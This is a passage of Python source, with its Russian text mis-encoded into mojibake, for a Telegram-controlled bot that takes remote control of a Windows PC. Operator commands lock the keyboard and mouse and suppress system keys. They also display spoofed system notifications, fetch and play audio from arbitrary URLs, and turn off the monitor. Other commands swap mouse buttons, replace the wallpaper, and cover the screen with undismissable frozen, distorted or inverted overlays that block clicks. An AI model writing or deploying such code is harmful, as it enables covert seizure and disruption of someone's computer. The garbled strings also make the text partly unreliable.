            bot.send_message(message.chat.id, "–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∏ –º—ã—à—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ù–∞–∂–º–∏—Ç–µ 'üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞' —Å–Ω–æ–≤–∞, —á—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å.")
            threading.Thread(target=block_input, daemon=True).start()
    except Exception as e:
        handle_error(e, "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–æ–π –≤–≤–æ–¥–∞")

def block_input():
    try:
        global input_blocked
        screen_width, screen_height = pyautogui.size()
        while input_blocked:
            # –ü–µ—Ä–µ–º–µ—â–∞–µ–º –º—ã—à—å –≤ —É–≥–æ–ª
            pyautogui.moveTo(screen_width - 1, screen_height - 1)
            # –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É, –ø–æ–≥–ª–æ—â–∞—è –≤–≤–æ–¥
            for key in ['ctrl', 'alt', 'shift', 'win', 'esc']:  # –ë–ª–æ–∫–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏
                pyautogui.keyDown(key)
                pyautogui.keyUp(key)
            time.sleep(0.5)
    except Exception as e:
        handle_error(e, "–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –≤–≤–æ–¥–∞")
    finally:
        pyautogui.FAILSAFE = True  # –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º failsafe

@bot.message_handler(func=lambda message: message.text == "üì¢ –°–∏—Å—Ç–µ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ")
def send_system_notification(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, Telegram Bot):")
        bot.register_next_step_handler(message, lambda msg: process_notification_sender(msg))
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")

def process_notification_sender(message):
    try:
        if not check_id(message):
            return
        sender = message.text
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:")
        bot.register_next_step_handler(message, lambda msg: process_notification_text(msg, sender))
    except Exception as e:
        handle_error(e, "–æ–±—Ä–∞–±–æ—Ç–∫–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")

def process_notification_text(message, sender):
    try:
        if not check_id(message):
            return
        text = message.text
        toaster = ToastNotifier()
        toaster.show_toast(sender, text, duration=10, threaded=True)
        bot.send_message(message.chat.id, "–°–∏—Å—Ç–µ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!")
    except Exception as e:
        handle_error(e, "–æ—Ç–ø—Ä–∞–≤–∫–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")

@bot.message_handler(func=lambda message: message.text == "üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫ –ø–æ —Å—Å—ã–ª–∫–µ")
def play_url_sound(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∞—É–¥–∏–æ—Ñ–∞–π–ª (MP3/WAV)")
        bot.register_next_step_handler(message, play_url_audio)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –∑–≤—É–∫–∞ –ø–æ —Å—Å—ã–ª–∫–µ")

def play_url_audio(message):
    global sound_playing
    try:
        url = message.text
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —Å—Å—ã–ª–∫–∞ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–π
        if not url.startswith("http"):
            bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞: –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É (–Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å http –∏–ª–∏ https).")
            return

        # –°–∫–∞—á–∏–≤–∞–µ–º —Ñ–∞–π–ª
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å—Å—ã–ª–∫—É.")
            return

        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –∏–∑ URL
        file_extension = url.lower().split(".")[-1]
        if file_extension not in ["mp3", "wav"]:
            bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞: –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ MP3 –∏ WAV —Ñ–∞–π–ª—ã.")
            return

        temp_file = f"temp_audio.{file_extension}"
        with open(temp_file, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)

        # –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ñ–æ—Ä–º–∞—Ç–∞
        if file_extension == "wav":
            # –î–ª—è WAV –∏—Å–ø–æ–ª—å–∑—É–µ–º winsound
            sound_playing = True
            winsound.PlaySound(temp_file, winsound.SND_FILENAME | winsound.SND_ASYNC)
            bot.send_message(message.chat.id, "–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ WAV –Ω–∞—á–∞—Ç–æ. –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –º–æ–∂–Ω–æ —á–µ—Ä–µ–∑ '‚õî –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —à—É—Ç–∫–∏'.")
            while sound_playing and prank_active:  # –ò—Å–ø–æ–ª—å–∑—É–µ–º prank_active –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
                time.sleep(1)
            winsound.PlaySound(None, 0)  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–≤—É–∫
            os.remove(temp_file)
        else:
            # –î–ª—è MP3 –∏—Å–ø–æ–ª—å–∑—É–µ–º os.startfile (–æ—Ç–∫—Ä–æ–µ—Ç—Å—è –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º –ø—Ä–æ–∏–≥—Ä—ã–≤–∞—Ç–µ–ª–µ)
            bot.send_message(message.chat.id, "–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ MP3 –Ω–∞—á–∞—Ç–æ –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º –ø—Ä–æ–∏–≥—Ä—ã–≤–∞—Ç–µ–ª–µ. –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –º–æ–∂–Ω–æ –≤—Ä—É—á–Ω—É—é.")
            os.startfile(temp_file)  # –û—Ç–∫—Ä—ã–≤–∞–µ–º MP3 –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º –ø—Ä–æ–∏–≥—Ä—ã–≤–∞—Ç–µ–ª–µ
            # –ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –Ω–µ –º–æ–∂–µ–º —É–ø—Ä–∞–≤–ª—è—Ç—å –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ–º, –æ—Å—Ç–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –¥–æ —Ä—É—á–Ω–æ–≥–æ –∑–∞–∫—Ä—ã—Ç–∏—è
            # –§–∞–π–ª —É–¥–∞–ª–∏—Ç—Å—è –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º –≤—ã–∑–æ–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏–ª–∏ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞
    except Exception as e:
        handle_error(e, "–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–∏ –∑–≤—É–∫–∞ –ø–æ —Å—Å—ã–ª–∫–µ")
        if os.path.exists("temp_audio.mp3"):
            os.remove("temp_audio.mp3")
        if os.path.exists("temp_audio.wav"):
            os.remove("temp_audio.wav")

@bot.message_handler(func=lambda message: message.text == "üñ• –ú–æ–Ω–∏—Ç–æ—Ä")
def monitor_control(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–í–∫–ª—é—á–∏—Ç—å", callback_data="monitor:on"))
        markup.add(types.InlineKeyboardButton("–í—ã–∫–ª—é—á–∏—Ç—å", callback_data="monitor:off"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:fun"))
        bot.send_message(message.chat.id, "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–æ–º:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –º–æ–Ω–∏—Ç–æ—Ä–æ–º")

@bot.callback_query_handler(func=lambda call: call.data.startswith("monitor:"))
def monitor_callback(call):
    try:
        action = call.data.split(":", 1)[1]
        if action == "off":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            bot.answer_callback_query(call.id, "–ú–æ–Ω–∏—Ç–æ—Ä –≤—ã–∫–ª—é—á–µ–Ω")
        elif action == "on":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            bot.answer_callback_query(call.id, "–ú–æ–Ω–∏—Ç–æ—Ä –≤–∫–ª—é—á—ë–Ω")
    except Exception as e:
        handle_error(e, "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–∏ –º–æ–Ω–∏—Ç–æ—Ä–æ–º")

@bot.message_handler(func=lambda message: message.text == "üñ± –ò–Ω–≤–µ—Ä—Å–∏—è –º—ã—à–∏")
def invert_mouse(message):
    try:
        if not check_id(message):
            return
        current = ctypes.windll.user32.GetSystemMetrics(23)
        ctypes.windll.user32.SwapMouseButton(1 if current == 0 else 0)
        bot.send_message(message.chat.id, "–ö–Ω–æ–ø–∫–∏ –º—ã—à–∏ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω—ã")
    except Exception as e:
        handle_error(e, "–∏–Ω–≤–µ—Ä—Å–∏–∏ –º—ã—à–∏")

@bot.message_handler(func=lambda message: message.text == "üñº –°–º–µ–Ω–∞ –æ–±–æ–µ–≤")
def change_wallpaper_menu(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤")
        bot.register_next_step_handler(message, change_wallpaper)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —Å–º–µ–Ω—ã –æ–±–æ–µ–≤")

def change_wallpaper(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ")
            return
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("wallpaper.jpg", "wb") as f:
            f.write(downloaded_file)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wallpaper.jpg"), 3)
        bot.send_message(message.chat.id, "–û–±–æ–∏ –∏–∑–º–µ–Ω–µ–Ω—ã")
    except Exception as e:
        handle_error(e, "—Å–º–µ–Ω–µ –æ–±–æ–µ–≤")

@bot.message_handler(func=lambda message: message.text == "üì∏ –û—Ç–∫—Ä—ã—Ç—å —Ñ–æ—Ç–æ")
def open_photo_menu(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å —Ñ–æ—Ç–æ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω")
        bot.register_next_step_handler(message, open_photo)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–æ—Ç–æ")

def open_photo(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å —Ñ–æ—Ç–æ")
            return
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        image_path = "fullscreen_image.jpg"
        with open(image_path, "wb") as f:
            f.write(downloaded_file)
        threading.Thread(target=show_fullscreen_image, args=(image_path, message.chat.id), daemon=True).start()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ó–∞–∫—Ä—ã—Ç—å —Ñ–æ—Ç–æ", callback_data="close_photo"))
        bot.send_message(message.chat.id, "–§–æ—Ç–æ –æ—Ç–∫—Ä—ã—Ç–æ. –ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ—Ç–∫—Ä—ã—Ç–∏–∏ —Ñ–æ—Ç–æ")

def show_fullscreen_image(image_path, chat_id):
    try:
        if not os.path.exists(image_path):
            bot.send_message(chat_id, "–û—à–∏–±–∫–∞: —Ñ–∞–π–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return
        
        process = subprocess.Popen([sys.executable, "-c", f"""
import tkinter as tk
from PIL import Image, ImageTk
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
img = Image.open('{image_path}')
img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
photo = ImageTk.PhotoImage(image=img)
label = tk.Label(root, image=photo)
label.pack()
root.mainloop()
"""], creationflags=subprocess.CREATE_NO_WINDOW)
        
        with open("fullscreen_image_pid.txt", "w") as f:
            f.write(str(process.pid))
    except Exception as e:
        handle_error(e, "–æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–∏ —Ñ–æ—Ç–æ –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω")

@bot.callback_query_handler(func=lambda call: call.data == "close_photo")
def close_photo(call):
    try:
        if os.path.exists("fullscreen_image_pid.txt"):
            with open("fullscreen_image_pid.txt", "r") as f:
                pid = int(f.read().strip())
            os.kill(pid, 9)
            os.remove("fullscreen_image_pid.txt")
        if os.path.exists("fullscreen_image.jpg"):
            os.remove("fullscreen_image.jpg")
        bot.answer_callback_query(call.id, "–§–æ—Ç–æ –∑–∞–∫—Ä—ã—Ç–æ")
    except Exception as e:
        handle_error(e, "–∑–∞–∫—Ä—ã—Ç–∏–∏ —Ñ–æ—Ç–æ")

@bot.message_handler(func=lambda message: message.text == "üòÇ –®—É—Ç–∫–∏")
def pranks_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ü–µ—Ä–µ–≤–æ—Ä–æ—Ç —ç–∫—Ä–∞–Ω–∞", callback_data="prank:rotate"))
        markup.add(types.InlineKeyboardButton("–ò—Å–∫–∞–∂–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞", callback_data="prank:distort"))
        markup.add(types.InlineKeyboardButton("–ò–Ω–≤–µ—Ä—Å–∏—è —Ü–≤–µ—Ç–∞", callback_data="prank:invert"))
        markup.add(types.InlineKeyboardButton("–°–º–∞–π–ª–∏–∫–∏ DVD", callback_data="prank:smiles"))
        markup.add(types.InlineKeyboardButton("–¢–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—è –∫—É—Ä—Å–æ—Ä–∞", callback_data="prank:cursor"))
        markup.add(types.InlineKeyboardButton("–°–∫—Ä—ã—Ç—å –ø–∞–Ω–µ–ª—å –∑–∞–¥–∞—á", callback_data="prank:hide_taskbar"))
        markup.add(types.InlineKeyboardButton("–°–ª—É—á–∞–π–Ω–æ–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –æ–∫–æ–Ω", callback_data="prank:move_windows"))
        markup.add(types.InlineKeyboardButton("–ì–æ–≤–æ—Ä—è—â–∏–π –ü–ö", callback_data="prank:speak"))
        markup.add(types.InlineKeyboardButton("–≠—Ñ—Ñ–µ–∫—Ç –∑–∞–º–æ—Ä–æ–∑–∫–∏", callback_data="prank:freeze"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:fun"))
        bot.send_message(message.chat.id, "–®—É—Ç–∫–∏:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —à—É—Ç–æ–∫")

@bot.callback_query_handler(func=lambda call: call.data.startswith("prank:"))
def prank_callback(call):
    try:
        if not check_id(call.message):
            return
        prank_type = call.data.split(":")[1]
        global prank_active, prank_threads
        prank_active = True
        block_windows()  # –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–ª–∞–≤–∏—à—É Windows –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —à—É—Ç–∫–∏

        def rotate_screen():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                rotated_img = img.rotate(180)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")  # –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–ª–∏–∫–∏ –º—ã—à–∏
                root.bind("<Button-3>", lambda event: "break")  # –ë–ª–æ–∫–∏—Ä—É–µ–º –ø—Ä–∞–≤—ã–π –∫–ª–∏–∫
                photo = ImageTk.PhotoImage(image=rotated_img)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "–≠–∫—Ä–∞–Ω –ø–µ—Ä–µ–≤—ë—Ä–Ω—É—Ç!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
                handle_error(e, "–ø–µ—Ä–µ–≤–æ—Ä–æ—Ç–µ —ç–∫—Ä–∞–Ω–∞")

        def distort_screen():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), highlightthickness=0)
                canvas.pack()
                bot.answer_callback_query(call.id, "–≠–∫—Ä–∞–Ω –∏—Å–∫–∞–∂—ë–Ω!")
                img_array = np.array(img)
                original_img_array = img_array.copy()
                height, width = img_array.shape[:2]
                last_reset_time = time.time()
                last_zoom_time = time.time()
                zoom_scale = 1.0  # –ù–∞—á–∏–Ω–∞–µ–º —Å –Ω–æ—Ä–º–∞–ª—å–Ω–æ–≥–æ –º–∞—Å—à—Ç–∞–±–∞
                zoom_images = []
                while prank_active:
                    current_time = time.time()
                    # –ß–∞—Å—Ç–∏—á–Ω—ã–π —Å–±—Ä–æ—Å —à—É–º–∞ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
                    if current_time - last_reset_time >= 10:
                        # –°–º–µ—à–∏–≤–∞–µ–º —Ç–µ–∫—É—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∏—Å—Ö–æ–¥–Ω—ã–º (50% –Ω–∞ 50%)
                        img_array = (img_array.astype(np.float32) * 0.5 + original_img_array.astype(np.float32) * 0.5).astype(np.uint8)
                        last_reset_time = current_time
                        # –ù–µ —Å–±—Ä–∞—Å—ã–≤–∞–µ–º zoom_images –∏ zoom_scale
                    # –†–∞–∑—Ä—ã–≤—ã (—Å–¥–≤–∏–≥–∏ —Å—Ç—Ä–æ–∫)
                    for i in range(0, height, 20):
                        shift = random.randint(-50, 50)
                        img_array[i:i+20, :, :] = np.roll(img_array[i:i+20, :, :], shift, axis=1)
                    # –°–ª—É—á–∞–π–Ω—ã–µ –≥–ª–∏—Ç—á-—ç—Ñ—Ñ–µ–∫—Ç—ã
                    if random.random() < 0.5:
                        noise = np.random.randint(-50, 50, img_array.shape, dtype=np.int16)
                        img_array = np.clip(img_array.astype(np.int16) + noise, 0, 255).astype(np.uint8)
                    if random.random() < 0.3:
                        y_start = random.randint(0, height - 100)
                        x_start = random.randint(0, width - 100)
                        block = img_array[y_start:y_start+100, x_start:x_start+100, :]
                        img_array[y_start:y_start+100, x_start:x_start+100, :] = 255 - block
                    if random.random() < 0.2:
                        channel = random.choice([0, 1, 2])
                        img_array[:, :, channel] = np.clip(img_array[:, :, channel].astype(np.int16) + random.randint(-30, 30), 0, 255).astype(np.uint8)
                    # –ù–æ–≤—ã–µ –ø—Ä–∏–∫–æ–ª—å–Ω—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã
                    if random.random() < 0.1:  # 10% —à–∞–Ω—Å –Ω–∞ —ç—Ñ—Ñ–µ–∫—Ç "–±–∏—Ç–æ–≥–æ —ç–∫—Ä–∞–Ω–∞"
                        for _ in range(random.randint(1, 5)):
                            y = random.randint(0, height - 1)
                            img_array[y:y+2, :, :] = np.random.randint(0, 255, (2, width, 3), dtype=np.uint8)
                    if random.random() < 0.15:  # 15% —à–∞–Ω—Å –Ω–∞ —ç—Ñ—Ñ–µ–∫—Ç "–ø–æ–ª–æ—Å—ã"
                        for _ in range(random.randint(1, 3)):
                            x_start = random.randint(0, width - 50)
                            y_start = random.randint(0, height - 50)
                            color = np.random.randint(0, 255, 3, dtype=np.uint8)
                            img_array[y_start:y_start+50, x_start:x_start+5, :] = color
                    if random.random() < 0.1:  # 10% —à–∞–Ω—Å –Ω–∞ —ç—Ñ—Ñ–µ–∫—Ç "—Ü–≤–µ—Ç–æ–≤–æ–≥–æ —Å–¥–≤–∏–≥–∞"
                        channel_shift = random.randint(-20, 20)
                        channel = random.choice([0, 1, 2])
                        img_array[:, :, channel] = np.roll(img_array[:, :, channel], channel_shift, axis=1)
                    # –≠—Ñ—Ñ–µ–∫—Ç —Ç—É–Ω–Ω–µ–ª—è (—É–º–µ–Ω—å—à–µ–Ω–∏–µ –º–∞—Å—à—Ç–∞–±–∞ –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É)
                    if current_time - last_zoom_time >= 1:
                        zoom_scale *= 0.9  # –£–º–µ–Ω—å—à–∞–µ–º –º–∞—Å—à—Ç–∞–± (—Å–æ–∑–¥–∞—ë–º —ç—Ñ—Ñ–µ–∫—Ç —Ç—É–Ω–Ω–µ–ª—è)
                        if zoom_scale < 0.1:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –º–∞—Å—à—Ç–∞–±
                            zoom_scale = 0.1
                        zoomed_img = Image.fromarray(img_array).resize(
                            (int(width * zoom_scale), int(height * zoom_scale)), Image.Resampling.LANCZOS
                        )
                        zoomed_img_array = np.array(zoomed_img)
                        zoomed_height, zoomed_width = zoomed_img_array.shape[:2]
                        offset_x = (width - zoomed_width) // 2
                        offset_y = (height - zoomed_height) // 2
                        zoom_images.append((zoomed_img_array, offset_x, offset_y))
                        last_zoom_time = current_time
                    # –û—Ç—Ä–∏—Å–æ–≤–∫–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
                    distorted_img = Image.fromarray(img_array)
                    photo = ImageTk.PhotoImage(image=distorted_img)
                    canvas.create_image(0, 0, image=photo, anchor="nw")
                    # –û—Ç—Ä–∏—Å–æ–≤–∫–∞ "–æ—Ç–¥–∞–ª—è—é—â–∏—Ö—Å—è" –∫–æ–ø–∏–π —Å –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å—é
                    for zoomed_img_array, offset_x, offset_y in zoom_images:
                        zoomed_img = Image.fromarray(zoomed_img_array)
                        zoomed_img.putalpha(int(255 * (zoom_scale / 1.0)))  # –ü—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å –∑–∞–≤–∏—Å–∏—Ç –æ—Ç –º–∞—Å—à—Ç–∞–±–∞
                        zoomed_photo = ImageTk.PhotoImage(image=zoomed_img)
                        canvas.create_image(offset_x, offset_y, image=zoomed_photo, anchor="nw")
                        canvas.zoomed_photo = zoomed_photo
                    root.update()
                    time.sleep(0.2)
                    canvas.delete("all")
                root.destroy()
            except Exception as e:
                handle_error(e, "–∏—Å–∫–∞–∂–µ–Ω–∏–∏ —ç–∫—Ä–∞–Ω–∞")

        def invert_colors():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                img_inverted = Image.eval(img, lambda x: 255 - x)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                photo = ImageTk.PhotoImage(image=img_inverted)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "–¶–≤–µ—Ç–∞ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω—ã!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
                handle_error(e, "–∏–Ω–≤–µ—Ä—Å–∏–∏ —Ü–≤–µ—Ç–∞")

        def dvd_smiles():
            try:
                if not prank_active:
                    return
                windows = []
                for _ in range(5):
                    root = tk.Tk()
                    root.overrideredirect(True)
                    root.attributes('-topmost', True)
                    root.attributes('-transparentcolor', 'black')
                    root.configure(bg='black')
                    smile = random.choice(["üòÄ", "üòÅ", "üòÇ", "ü§ì", "üòé"])
                    label = tk.Label(root, text=smile, font=("Arial", 50), bg="black", fg="yellow")
                    label.pack()
                    dx = random.randint(5, 10) * random.choice([-1, 1])
                    dy = random.randint(5, 10) * random.choice([-1, 1])
                    x = random.randint(0, root.winfo_screenwidth() - 100)
                    y = random.randint(0, root.winfo_screenheight() - 100)
                    root.geometry(f"100x100+{x}+{y}")
                    windows.append((root, label, dx, dy, x, y))
                    root.update()
                bot.answer_callback_query(call.id, "–°–º–∞–π–ª–∏–∫–∏ DVD –∑–∞–ø—É—â–µ–Ω—ã!")
                while prank_active:
                    for i, (root, label, dx, dy, x, y) in enumerate(windows):
                        x += dx
                        y += dy
                        screen_width = root.winfo_screenwidth()
                        screen_height = root.winfo_screenheight()
                        if x <= 0 or x >= screen_width - 100:
                            dx = -dx
                        if y <= 0 or y >= screen_height - 100:
                            dy = -dy
                        root.geometry(f"100x100+{int(x)}+{int(y)}")
                        root.update()
                        windows[i] = (root, label, dx, dy, x, y)
                    time.sleep(0.05)
                for root, _, _, _, _, _ in windows:
                    root.destroy()
            except Exception as e:
                handle_error(e, "–∞–Ω–∏–º–∞—Ü–∏–∏ —Å–º–∞–π–ª–∏–∫–æ–≤ DVD")

        def freeze_effect():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                photo = ImageTk.PhotoImage(image=img)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "–≠–∫—Ä–∞–Ω –∑–∞–º–æ—Ä–æ–∂–µ–Ω!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
